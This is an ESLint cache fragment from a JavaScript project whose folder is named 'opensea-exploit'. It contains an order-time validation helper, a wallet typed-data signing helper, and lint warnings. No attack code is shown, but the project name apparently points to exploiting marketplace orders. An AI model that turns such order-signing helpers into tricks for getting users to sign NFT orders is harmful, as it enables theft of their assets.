createOrder;","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/EncodeSell.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/GetTimeParameters.js",["168","169","170","171"],"import BigNumber from \"bignumber.js\";\nimport { MIN_EXPIRATION_SECONDS, ORDER_MATCHING_LATENCY_SECONDS } from \"../Constants\";\n\nconst getTimeParameters = (expirationTimestamp, listingTimestamp, waitingForBestCounterOrder = false) => {\n    // Validation\n    const minListingTimestamp = Math.round(Date.now() / 1000);\n    const minExpirationTimestamp = Math.round(Date.now() / 1000 + MIN_EXPIRATION_SECONDS);\n\n    if (expirationTimestamp != 0 && expirationTimestamp < minExpirationTimestamp) {\n        throw new Error(`Expiration time must be at least ${MIN_EXPIRATION_SECONDS} seconds from now, or zero (non-expiring).`);\n    }\n\n    if (listingTimestamp && listingTimestamp < minListingTimestamp) {\n        throw new Error(\"Listing time cannot be in the past.\");\n    }\n\n    if (listingTimestamp && expirationTimestamp != 0 && listingTimestamp >= expirationTimestamp) {\n        throw new Error(\"Listing time must be before the expiration time.\");\n    }\n\n    if (waitingForBestCounterOrder && expirationTimestamp == 0) {\n        throw new Error(\"English auctions must have an expiration time.\");\n    }\n\n    if (waitingForBestCounterOrder && listingTimestamp) {\n        throw new Error(`Cannot schedule an English auction for the future.`);\n    }\n\n    if (parseInt(expirationTimestamp.toString()) != expirationTimestamp) {\n        throw new Error(`Expiration timestamp must be a whole number of seconds`);\n    }\n\n    if (waitingForBestCounterOrder) {\n        listingTimestamp = expirationTimestamp;\n        \n        // Expire one week from now, to ensure server can match it\n        // Later, this will expire closer to the listingTime\n        expirationTimestamp = expirationTimestamp + ORDER_MATCHING_LATENCY_SECONDS;\n    } else {\n        // Small offset to account for latency\n        listingTimestamp = listingTimestamp || Math.round(Date.now() / 1000 - 100);\n    }\n\n    return {\n        listingTime: BigNumber(listingTimestamp),\n        expirationTime: BigNumber(expirationTimestamp),\n    };\n};\n\nexport default getTimeParameters;","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/SignTypedDataAsync.js",["172"],"import parseSignatureHex from \"./ParseSignatureHex\";\n\nasync function signTypedDataAsync(provider, message, signerAddress) {\n    let signature;\n    return new Promise((resolve, reject) => {\n        const callback = async (err, result) => {\n            console.log(err);\n            if (err) reject(err);\n            if (result.error) {\n                reject(result.error.message);\n            };\n\n            // eslint-disable-next-line prefer-promise-reject-errors\n            if (result.error) return reject(\"ERROR\", result);\n            // console.log(result);\n            // const d = result.result;\n\n            // let v = d.slice(-2);\n            // let r = d.slice(2, -66);\n            // let s = d.slice(-66, -2);\n\n            // let actualsignature = v + r + s + '03';\n            resolve(parseSignatureHex(result.result));\n        };\n\n        const stringified = JSON.stringify({ ...message });\n\n        try {\n            // Using sign typed data V4 works with a stringified message, used by browser providers i.e. Metamask\n            provider.sendAsync({\n                method: \"eth_signTypedData_v4\",\n                params: [signerAddress, stringified],\n                from: signerAddress,\n                id: new Date().getTime(),\n            }, callback);\n        } catch (error) {\n            console.log(error);\n\n            // Fallback to normal sign typed data for node providers, without using stringified message\n            // https://github.com/coinbase/coinbase-wallet-sdk/issues/60\n            provider.sendAsync({\n                method: \"eth_signTypedData\",\n                params: [signerAddress, message],\n                from: signerAddress,\n                id: new Date().getTime(),\n            }, callback);\n        };\n    });\n};\n\nexport default signTypedDataAsync;","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/EncodeCall.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/ParseSignatureHex.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/methods/CancelOrder.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/methods/PerformOrder.js",["173","174","175","176","177","178"],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/EncodeBuy.js",[],{"ruleId":"179","replacedBy":"180"},{"ruleId":"181","replacedBy":"182"},{"ruleId":"183","severity":1,"message":"184","line":6,"column":23,"nodeType":"185","messageId":"186","endLine":6,"endColumn":35},{"ruleId":"187","severity":1,"message":"188","line":85,"column":29,"nodeType":"189","messageId":"190","endLine":85,"endColumn":31},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":153,"endColumn":3},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":284,"endColumn":3},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":563,"endColumn":3},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":845,"endColumn":3},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":236,"endColumn":3},{"ruleId":"179","replacedBy":"194"},{"ruleId":"181","replacedBy":"195"},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":153,"endColumn":3},{"ruleId":"191","severity":1,"message":"192","line":1,"column":1,"nodeType":"193","endLine":152,"endColumn":3},{"ruleId":"183","severity":1,"message":"196","line":3,"column":10,"nodeType":"185","messageId":"186","endLine":3,"endColumn":19},{"ruleId":"183","severity":1,"message":"197","line":3,"column":21,"nodeType":"185","messageId":"186","endLine":3,"endColumn":28},{"ruleId":"183","severity":1,"message":"198","line":4,"column":10,"nodeType":"185","messageId":"186","endLine":4,"endColumn":22},{"ruleId":"183","severity":1,"message":"199","line":7,"column":8,"nodeType":"185","messageId":"186","endLine":7,"endColumn":22},{"ruleId":"183","severity":1,"message":"200","line":8,"column":10,"nodeType":"185","messageId":"186","endLine":8,"endColumn":20},{"ruleId":"183","severity":1,"message":"201","line":17,"column":10,"nodeType":"185","messageId":"186","endLine":17,"endColumn":35},{"ruleId":"183","severity":1,"message":"202","line":17,"column":37,"nodeType":"185","messageId":"186","endLine":17,"endColumn":61},{"ruleId":"183","severity":1,"message":"203","line":17,"column":63,"nodeType":"185","messageId":"186","endLine":17,"endColumn":86},{"ruleId":"183","severity":1,"message":"204","line":18,"column":10,"nodeType":"185","messageId":"186","endLine":18,"endColumn":31},{"ruleId":"183","severity":1,"message":"205","line":18,"column":33,"nodeType":"185","messageId":"186","endLine":18,"endColumn":48},{"ruleId":"183","severity":1,"message":"206","line":18,"column":50,"nodeType":"185","messageId":"186","endLine":18,"endColumn":69},{"ruleId":"183","severity":1,"message":"207","line":18,"column":71,"nodeType":"185","messageId":"186","endLine":18,"endColumn":101},{"ruleId":"183","severity":1,"message":"208","line":18,"column":103,"nodeType":"185","messageId":"186","endLine":18,"endColumn":134},{"ruleId":"183","severity":1,"message":"209","line":18,"column":136,"nodeType":"185","messageId":"186","endLine":18,"endColumn":170},{"ruleId":"183","severity":1,"message":"210","line":18,"column":172,"nodeType":"185","messageId":"186","endLine":18,"endColumn":190},{"ruleId":"183","severity":1,"message":"211","line":18,"column":192,"nodeType":"185","messageId":"186","endLine":18,"endColumn":221},{"ruleId":"183","severity":1,"message":"212","line":18,"column":223,"nodeType":"185","messageId":"186","endLine":18,"endColumn":247},{"ruleId":"183","severity":1,"message":"213","line":19,"column":10,"nodeType":"185","messageId":"186","endLine":19,"endColumn":38},{"ruleId":"183","severity":1,"message":"214","line":20,"column":10,"nodeType":"185","messageId":"186","endLine":20,"endColumn":26},{"ruleId":"183","severity":1,"message":"215","line":20,"column":28,"nodeType":"185","messageId":"186","endLine":20,"endColumn":50},{"ruleId":"183","severity":1,"message":"216","line":20,"column":52,"nodeType":"185","messageId":"186","endLine":20,"endColumn":77},{"ruleId":"183","severity":1,"message":"217","line":21,"column":10,"nodeType":"185","messageId":"186","endLine":21,"endColumn":29},{"ruleId":"183","severity":1,"message":"218","line":24,"column":10,"nodeType":"185","messageId":"186","endLine":24,"endColumn":24},{"ruleId":"183","severity":1,"message":"219","line":32,"column":8,"nodeType":"185","messageId":"186","endLine":32,"endColumn":18},{"ruleId":"183","severity":1,"message":"220","line":33,"column":8,"nodeType":"185","messageId":"186","endLine":33,"endColumn":26},{"ruleId":"183","severity":1,"message":"221","line":34,"column":8,"nodeType":"185","messageId":"186","endLine":34,"endColumn":18},{"ruleId":"187","severity":1,"message":"222","line":71,"column":65,"nodeType":"189","messageId":"190","endLine":71,"endColumn":67},{"ruleId":"223","severity":2,"message":"224","line":106,"column":29,"nodeType":"185","messageId":"225","endLine":106,"endColumn":49},{"ruleId":"183","severity":1,"message":"226","line":110,"column":10,"nodeType":"185","messageId":"186","endLine":110,"endColumn":29},{"ruleId":"187","severity":1,"message":"222","line":111,"column":36,"nodeType":"189","messageId":"190","endLine":111,"endColumn":38},{"ruleId":"187","severity":1,"message":"222","line":269,"column":68,"nodeType":"189","messageId":"190","endLine":269,"endColumn":70},{"ruleId":"187","severity":1,"message":"222","line":273,"column":67,"nodeType":"189","messageId":"190","endLine":273,"endColumn":69},{"ruleId":"183","severity":1,"message":"227","line":285,"column":16,"nodeType":"185","messageId":"186","endLine":285,"endColumn":24},{"ruleId":"183","severity":1,"message":"228","line":290,"column":16,"nodeType":"185","messageId":"186","endLine":290,"endColumn":25},{"ruleId":"183","severity":1,"message":"229","line":308,"column":7,"nodeType":"185","messageId":"186","endLine":308,"endColumn":23},{"ruleId":"187","severity":1,"message":"222","line":110,"column":28,"nodeType":"189","messageId":"190","endLine":110,"endColumn":30},{"ruleId":"187","severity":1,"message":"222","line":366,"column":14,"nodeType":"189","messageId":"190","endLine":366,"endColumn":16},{"ruleId":"187","severity":1,"message":"222","line":375,"column":42,"nodeType":"189","messageId":"190","endLine":375,"endColumn":44},{"ruleId":"187","severity":1,"message":"222","line":607,"column":46,"nodeType":"189","messageId":"190","endLine":607,"endColumn":48},{"ruleId":"187","severity":1,"message":"222","line":607,"column":70,"nodeType":"189","messageId":"190","endLine":607,"endColumn":72},{"ruleId":"187","severity":1,"message":"188","line":9,"column":29,"nodeType":"189","messageId":"190","endLine":9,"endColumn":31},{"ruleId":"187","severity":1,"message":"188","line":17,"column":49,"nodeType":"189","messageId":"190","endLine":17,"endColumn":51},{"ruleId":"187","severity":1,"message":"222","line":21,"column":59,"nodeType":"189","messageId":"190","endLine":21,"endColumn":61},{"ruleId":"187","severity":1,"message":"188","line":29,"column":50,"nodeType":"189","messageId":"190","endLine":29,"endColumn":52},{"ruleId":"183","severity":1,"message":"230","line":4,"column":9,"nodeType":"185","messageId":"186","endLine":4,"endColumn":18},{"ruleId":"183","severity":1,"message":"231","line":24,"column":11,"nodeType":"185","messageId":"186","endLine":24,"endColumn":18},{"ruleId":"187","severity":1,"message":"222","line":104,"column":31,"nodeType":"189","messageId":"190","endLine":104,"endColumn":33},{"ruleId":"187","severity":1,"message":"222","line":159,"column":36,"nodeType":"189","messageId":"190","endLine":159,"endColumn":38},{"ruleId":"183","severity":1,"message":"232","line":193,"column":7,"nodeType":"185","messageId":"186","endLine":193,"endColumn":24},{"ruleId":"187","severity":1,"message":"222","line":206,"column":26,"nodeType":"189","messageId":"190","endLine":206,"endColumn":28},{"ruleId":"187","severity":1,"message":"222","line":381,"column":14,"nodeType":"189","messageId":"190","endLine":381,"endColumn":16},"no-native-reassign",["233"],"no-negated-in-lhs",["234"],"no-unused-vars","'fulfillOrder' is defined but never used.","Identifier","unusedVar","eqeqeq","Expected '!==' and instead saw '!='.","BinaryExpression","unexpected","import/no-anonymous-default-export","Assign array to a variable before exporting as module default","ExportDefaultDeclaration",["233"],["234"],"'HowToCall' is defined but never used.","'Network' is defined but never used.","'ERC721Schema' is defined but never used.","'isValidAddress' is defined but never used.","'parseEther' is defined but never used.","'ACTIVITY_POLLING_INTERVAL' is defined but never used.","'LISTING_POLLING_INTERVAL' is defined but never used.","'OFFERS_POLLING_INTERVAL' is defined but never used.","'OPENSEA_FEE_RECIPIENT' is defined but never used.","'NULL_BLOCK_HASH' is defined but never used.","'INVERSE_BASIS_POINT' is defined but never used.","'DEFAULT_BUYER_FEE_BASIS_POINTS' is defined but never used.","'DEFAULT_SELLER_FEE_BASIS_POINTS' is defined but never used.","'OPENSEA_SELLER_BOUNTY_BASIS_POINTS' is defined but never used.","'DEFAULT_MAX_BOUNTY' is defined but never used.","'STATIC_CALL_TX_ORIGIN_ADDRESS' is defined but never used.","'MERKLE_VALIDATOR_MAINNET' is defined but never used.","'mainnetWyvernConfigByNetwork' is defined but never used.","'OrderTypesEIP712' is defined but never used.","'WyvernDomainNameEIP712' is defined but never used.","'WyvernDomainVersionEIP712' is defined but never used.","'StaticCheckTxOrigin' is defined but never used.","'WyvernContract' is defined but never used.","'encodeSell' is defined but never used.","'signTypedDataAsync' is defined but never used.","'encodeCall' is defined but never used.","Expected '===' and instead saw '=='.","no-undef","'estimateCurrentPrice' is not defined.","undef","'assignOrdersToSides' is defined but never used.","'getAsset' is defined but never used.","'postOrder' is defined but never used.","'orderToGolomJSON' is assigned a value but never used.","'signature' is defined but never used.","'isValid' is assigned a value but never used.","'_correctGasAmount' is assigned a value but never used.","no-global-assign","no-unsafe-negation"]